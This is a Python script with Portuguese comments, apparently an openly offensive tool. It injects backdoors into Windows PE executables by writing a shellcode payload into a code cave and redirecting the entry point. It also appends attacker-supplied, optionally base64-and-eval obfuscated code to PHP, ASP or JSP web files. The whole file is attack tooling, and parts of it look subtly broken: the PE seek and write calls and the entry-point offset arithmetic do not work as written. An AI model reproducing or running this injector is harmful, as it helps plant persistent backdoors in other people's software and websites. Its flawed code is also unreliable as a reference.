import pefile
import sys
import os
import struct
import argparse
import logging
import random
import base64

# Configuração de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def find_code_cave(pe, min_size):
    """
    Encontra uma code cave (espaço não utilizado) em um arquivo PE.
    """
    for section in pe.sections:
        size = section.SizeOfRawData
        if size < min_size:
            continue
        data = section.get_data()
        null_count = 0
        start = 0
        for i in range(size):
            if data[i] == 0:
                null_count += 1
                if null_count >= min_size:
                    start_offset = section.PointerToRawData + i - null_count + 1
                    return start_offset
            else:
                null_count = 0
    return None

def inject_payload(pe, cave_offset, payload):
    """
    Injeta um payload em uma code cave em um arquivo PE.
    """
    pe.seek(cave_offset)
    pe.write(payload)

def redirect_execution(pe, cave_offset):
    """
    Redireciona a execução para a code cave injetada.
    """
    entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    original_bytes = pe.get_bytes_from_rva(entry_point, 5)
    
    # Calcula o endereço da code cave em relação ao endereço base
    image_base = pe.OPTIONAL_HEADER.ImageBase
    cave_address = image_base + cave_offset - pe.sections[0].PointerToRawData + pe.sections[0].VirtualAddress

    # Cria o shellcode para redirecionar a execução para a code cave
    shellcode = b"\x68" + struct.pack("<I", cave_address)  # push <cave_address>
    shellcode += b"\xc3"  # ret

    # Modifica o ponto de entrada para redirecionar a execução para o shellcode
    pe.seek(pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase)
    pe.write(shellcode)

    return original_bytes

def restore_execution(pe, original_bytes):
    """
    Restaura a execução original após a execução do payload.
    """
    pe.seek(pe.OPTIONAL_HEADER.AddressOfEntryPoint + pe.OPTIONAL_HEADER.ImageBase)
    pe.write(original_bytes)

def inject_web_backdoor(target_file, backdoor_code, web_type):
    """
    Injeta um backdoor web em um arquivo alvo (PHP, ASP, etc.).
    """
    try:
        with open(target_file, "a") as f:
            if web_type == 'php':
                f.write("\n<?php " + backdoor_code + " ?>\n")
            elif web_type == 'asp':
                f.write("\n<% " + backdoor_code + " %>\n")
            elif web_type == 'jsp':
                f.write("\n<% " + backdoor_code + " %>\n")
            else:
                f.write("\n" + backdoor_code + "\n")
        logging.info(f"Backdoor web injetado em: {target_file}")
    except Exception as e:
        logging.error(f"Erro ao injetar backdoor web: {e}")
        sys.exit(1)

def obfuscate_web_backdoor(backdoor_code, web_type):
    """
    Ofusca o código do backdoor web.
    """
    if web_type == 'php':
        # Base64 encode
        encoded_code = base64.b64encode(backdoor_code.encode()).decode()
        obfuscated_code = f"""eval(base64_decode('{encoded_code}'));"""
        return obfuscated_code
    elif web_type == 'asp':
        # Implementar ofuscação para ASP
        return backdoor_code  # Placeholder
    elif web_type == 'jsp':
        # Implementar ofuscação para JSP
        return backdoor_code  # Placeholder
    else:
        return backdoor_code

def main():
    parser = argparse.ArgumentParser(description="Injetor de Backdoor em Arquivos PE e Web")
    parser.add_argument("-t", "--target", dest="target_file", required=True, help="Arquivo alvo (PE ou Web)")
    parser.add_argument("-p", "--payload", dest="payload_file", help="Arquivo de payload (shellcode para PE)")
    parser.add_argument("-o", "--output", dest="output_file", help="Arquivo de saída (opcional)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Modo verbose (exibe mais informações)")
    parser.add_argument("-r", "--restore", action="store_true", help="Restaura a execução original após o payload (não implementado completamente)")
    parser.add_argument("--tw", "--web-backdoor", dest="web_backdoor_code", help="Código do backdoor web a ser injetado")
    parser.add_argument("--web-type", dest="web_type", choices=['php', 'asp', 'jsp'], help="Tipo de arquivo web (php, asp, jsp)")
    parser.add_argument("--obfuscate", action="store_true", help="Ofusca o código do backdoor web")

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    target_file = args.target_file
    output_file = args.output_file if args.output_file else os.path.splitext(target_file)[0] + "_backdoored" + os.path.splitext(target_file)[1]

    # Injeção de Backdoor Web
    if args.web_backdoor_code:
        if args.web_type:
            backdoor_code = args.web_backdoor_code
            if args.obfuscate:
                backdoor_code = obfuscate_web_backdoor(backdoor_code, args.web_type)
            inject_web_backdoor(target_file, backdoor_code, args.web_type)
        else:
            logging.error("Erro: Tipo de arquivo web deve ser especificado com --web-type.")
            sys.exit(1)
        sys.exit(0)

    # Injeção de Payload PE
    payload_file = args.payload_file
    if not payload_file:
        logging.error("Erro: Arquivo de payload deve ser especificado para arquivos PE.")
        sys.exit(1)

    try:
        pe = pefile.PE(target_file)
    except pefile.PEFormatError:
        logging.error("Erro: Arquivo PE inválido.")
        sys.exit(1)

    # Lê o payload do arquivo
    try:
        with open(payload_file, "rb") as f:
            payload = f.read()
    except FileNotFoundError:
        logging.error("Erro: Arquivo de payload não encontrado.")
        sys.exit(1)

    # Encontra uma code cave grande o suficiente para o payload
    cave_offset = find_code_cave(pe, len(payload) + 100)  # Adiciona alguma folga
    if cave_offset is None:
        logging.error("Erro: Code cave não encontrada.")
        sys.exit(1)

    # Injeta o payload na code cave
    inject_payload(pe, cave_offset, payload)

    # Redireciona a execução para a code cave
    original_bytes = redirect_execution(pe, cave_offset)

    # Restaura a execução original (se especificado)
    if args.restore:
        restore_execution(pe, original_bytes)
        logging.info("Execução original restaurada (parcialmente implementado).")
    else:
        logging.warning("A restauração da execução original não está totalmente implementada. O programa pode não funcionar corretamente após a injeção.")

    # Salva o arquivo modificado
    pe.write(output_file)

    logging.info(f"Arquivo backdoored salvo como: {output_file}")

if __name__ == "__main__":
    main()
